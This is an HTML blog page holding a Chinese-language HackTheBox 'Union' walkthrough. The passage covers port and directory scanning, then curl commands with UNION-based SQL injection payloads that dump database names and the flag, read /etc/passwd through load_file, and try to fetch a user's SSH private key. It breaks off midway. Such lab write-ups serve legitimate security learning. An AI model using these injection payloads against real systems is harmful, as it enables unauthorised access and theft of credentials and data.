@@ -1,0 +1,718 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Crazyinside">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1234567891011121314151617181920212223242526272829Crazy:~&#x2F;HackThebox$ sudo nmap -sS 10.10.11.128 -p1-10000             [sudo] crazyinside 的密码：Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;ParrotOS.org ) at 2022-08-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Union">
+<meta property="og:url" content="http://example.com/2022/10/06/HackTheBox-Union/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829Crazy:~&#x2F;HackThebox$ sudo nmap -sS 10.10.11.128 -p1-10000             [sudo] crazyinside 的密码：Starting Nmap 7.92SVN ( https:&#x2F;&#x2F;ParrotOS.org ) at 2022-08-">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://www.worldisend.com/img/Union.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823205235496.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823205505851.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823205316504.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823210530407.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823211450152.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823211524981.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823211732192.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823212138173.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823212304280.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823214705155.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823215113726.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823215235273.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823215253201.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823220916538.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220823222149726.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.877Z">
+<meta property="article:modified_time" content="2022-08-23T14:49:26.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.worldisend.com/img/Union.png">
+  
+  
+  
+  <title>HackTheBox-Union - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackTheBox-Union"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          11k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          92 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HackTheBox-Union</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="https://www.worldisend.com/img/Union.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="Union"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ sudo nmap -sS 10.10.11.128 -p1-10000             <br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-23 20:41 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.128<br>Host is up (0.097s latency).<br>Not shown: 9999 filtered tcp ports (no-response)<br>PORT   STATE SERVICE<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 39.83 seconds<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackThebox$ sudo nmap -sC -sV 10.10.11.128 -p80              <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-23 20:42 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.128<br>Host is up (0.087s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds</span><br><span class="hljs-string">zsh: segmentation fault  sudo nmap -sC -sV 10.10.11.128 -p80</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs BASH">Crazy:~/HackThebox$ curl -I 10.10.11.128           <br>HTTP/1.1 200 OK<br>Server: nginx/1.18.0 (Ubuntu)<br>Date: Tue, 23 Aug 2022 12:43:28 GMT<br>Content-Type: text/html; charset=UTF-8<br>Connection: keep-alive<br>Set-Cookie: PHPSESSID=qpt8d98jfju7m8svbd01t8tunc; path=/<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate<br>Pragma: no-cache<br></code></pre></td></tr></table></figure>
+
+<p>Set-Cookie后边有个path.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;<br>  $(<span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br><br>    $(<span class="hljs-string">&#x27;form&#x27;</span>).on(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">function</span> (e) &#123;<br><br>    e.preventDefault();<br><br>      $.ajax(&#123;<br>        <span class="hljs-built_in">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<br>        url: <span class="hljs-string">&#x27;index.php&#x27;</span>,<br>        data: <span class="hljs-string">&#x27;player=&#x27;</span> + document.getElementsByName(<span class="hljs-string">&#x27;player&#x27;</span>)[0].value,<br>        async: <span class="hljs-literal">true</span>,<br>        success: <span class="hljs-keyword">function</span> (data) &#123;<br>          $(<span class="hljs-string">&#x27;#output&#x27;</span>).html(<span class="hljs-string">&quot;&quot;</span>);<br>          $(<span class="hljs-string">&#x27;#output&#x27;</span>).append(data);<br>        &#125;<br>      &#125;);<br><br>    &#125;);<br><br>  &#125;);<br></code></pre></td></tr></table></figure>
+
+<p>提交给index.php。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ dirsearch -u http://10.10.11.128/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.11.128/-_22-08-23_20-45-21.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-23_20-45-21.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.11.128/<br><br>[20:45:22] Starting: <br>[20:45:29] 403 -  564B  - /.htaccess.bak1<br>[20:45:29] 403 -  564B  - /.ht_wsr.txt<br>[20:45:29] 403 -  564B  - /.htaccess.sample<br>[20:45:29] 403 -  564B  - /.htaccess.orig<br>[20:45:29] 403 -  564B  - /.htaccessBAK<br>[20:45:29] 403 -  564B  - /.htm<br>[20:45:29] 403 -  564B  - /.htpasswd_test<br>[20:45:29] 403 -  564B  - /.htaccess_extra<br>[20:45:29] 403 -  564B  - /.htpasswds<br>[20:45:29] 403 -  564B  - /.htaccess_sc<br>[20:45:29] 403 -  564B  - /.htaccessOLD<br>[20:45:29] 403 -  564B  - /.htaccessOLD2<br>[20:45:29] 403 -  564B  - /.htaccess_orig<br>[20:45:29] 403 -  564B  - /.httr-oauth<br>[20:45:29] 403 -  564B  - /.html<br>[20:45:29] 403 -  564B  - /.htaccess.save<br>[20:45:51] 403 -  564B  - /admin/.htaccess<br>[20:46:00] 403 -  564B  - /administrator/.htaccess<br>[20:46:04] 403 -  564B  - /app/.htaccess<br>[20:46:11] 200 -    0B  - /config.php<br>[20:46:13] 301 -  178B  - /css  -&gt;  http://10.10.11.128/css/<br>[20:46:23] 200 -    1KB - /index.php<br></code></pre></td></tr></table></figure>
+
+<p>还有一个config.php。</p>
+<p><img src="https://www.worldisend.com/img/image-20220823205235496.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823205235496"></p>
+<p>似乎随便输什么都无所谓。都会返回这个页面：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823205505851.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823205505851"></p>
+<p>然后告诉我提交第一个flag：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823205316504.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823205316504"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ feroxbuster -u http://10.10.11.128 -b <span class="hljs-string">&quot;PHPSESSID=44ibmq1g6mbl8hsaa2q7sg90jk&quot;</span> -e<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://10.10.11.128<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🤯  Header                │ Cookie: PHPSESSID=44ibmq1g6mbl8hsaa2q7sg90jk<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>301      GET        7l       12w      178c http://10.10.11.128/css =&gt; http://10.10.11.128/css/<br>200      GET       42l       93w        0c http://10.10.11.128/index.php<br>200      GET       42l       93w        0c http://10.10.11.128/<br>200      GET 		1l        2w        0c http://10.10.11.128/firewall.php<br>[<span class="hljs-comment">####################] - 1m     90024/90024   0s      found:3       errors:0      </span><br>[<span class="hljs-comment">####################] - 1m     30000/30000   343/s   http://10.10.11.128 </span><br>[<span class="hljs-comment">####################] - 1m     30000/30000   344/s   http://10.10.11.128/ </span><br>[<span class="hljs-comment">####################] - 1m     30000/30000   344/s   http://10.10.11.128/css </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220823210530407.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823210530407"></p>
+<p>第二个提交flag页面什么都没有，我在index.php不断尝试，因为好歹它会提示Complete the challenge，或许会有其他不一样的提示。要字典丰富度肯定SQLMAP莫属了，我决定尝试SQLMAP去测一下目标会对哪些字符做出不同的反应。在不加–时会给一个跳转链接：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823211450152.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823211450152"></p>
+<p>但是如果payload有–，会只有信息而没有跳转链接：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823211524981.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823211524981"></p>
+<p>似乎还做了小写转换：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823211732192.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823211732192"></p>
+<p>又有新影响：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823212138173.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823212138173"></p>
+<p><img src="https://www.worldisend.com/img/image-20220823212304280.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823212304280"></p>
+<p>但是–还是在我数据里边的。但它还是会把–原封不动的放出来，可那为什么– 就没有下边跳转链接了呢。难道说只是局部把那跳转链接的代码给注释掉了么。那为什么’也没有跳转呢。（也没有啊。我觉得是当我提交的符号在结束时如果只有前半部分，变会没有跳转链接。复制了一段去尝试，发现SLEEP没有跳转链接：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823214705155.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823214705155"></p>
+<p>只要SLEEP连在一起就没有跳转链接，分开就会有。可这有什么意义呢？</p>
+<p><img src="https://www.worldisend.com/img/image-20220823215113726.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823215113726"></p>
+<p><img src="https://www.worldisend.com/img/image-20220823215235273.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823215235273"></p>
+<p><img src="https://www.worldisend.com/img/image-20220823215253201.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823215253201"></p>
+<p>似乎只要 – xxxx就没有跳转链接，这四个还必须是字母，不能为数字。可这跳转链接有没有好像没什么用啊。我觉得我思考的方向错了，我应该去写一条正常的数据库查询语句，然后尝试在前后添加各式各样的符号，看什么时候这语句能正常打印出来，试了很久发现，原来就这么简单：</p>
+<p><img src="https://www.worldisend.com/img/image-20220823220916538.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823220916538"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl -X POST http://10.10.11.128/ -d <span class="hljs-string">&quot;player=&#x27; union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata;-- -&quot;</span>                           <br>Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackThebox$ curl -s -X POST http://10.10.11.128 -d <span class="hljs-string">&quot;player=&#x27; union select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=&#x27;november&#x27;;-- -&quot;</span><br>Sorry, flag,players you are not eligible due to already qualifying.  <br><br>Crazy:~/HackThebox$ curl -X POST http://10.10.11.128 -d <span class="hljs-string">&quot;player=&#x27; union select group_concat(column_name) from INFORMATION_SCHEMA.columns where table_name=&#x27;flag&#x27;;-- -&quot;</span> <br>Sorry, one you are not eligible due to already qualifying.   <br><br>Crazy:~/HackThebox$ curl -X POST http://10.10.11.128 -d <span class="hljs-string">&quot;player=&#x27; union select group_concat(one) from flag;-- -&quot;</span>                                           <br>Sorry, UHC&#123;F1rst_5tep_2_Qualify&#125; you are not eligible due to already qualifying. <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220823222149726.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220823222149726"></p>
+<p>现在为我打开了一个22端口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ nc 10.10.11.128 22 -zv<br>10.10.11.128: inverse host lookup failed: Unknown host<br>(UNKNOWN) [10.10.11.128] 22 (ssh) open<br></code></pre></td></tr></table></figure>
+
+<p>尝试读取文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl -X POST http://10.10.11.128 -d <span class="hljs-string">&quot;player=&#x27; union select load_file(&#x27;/etc/passwd&#x27;);-- -&quot;</span>   <br>Sorry, root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>htb:x:1000:1000:htb:/home/htb:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false<br>uhc:x:1001:1001:,,,:/home/uhc:/bin/bash<br> you are not eligible due to already qualifying.   <br></code></pre></td></tr></table></figure>
+
+<p>并没有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl -X POST http://10.10.11.128 -d <span class="hljs-string">&quot;player=&#x27; union select load_file(&#x27;/home/uhc/.ssh/id_rsa&#x27;);-- -&quot;</span><br>Sorry,  you are not eligible due to already qualifying.  <br></code></pre></td></tr></table></figure>
+
+<p>尝试读取配置文件，爆路径看到的：</p>
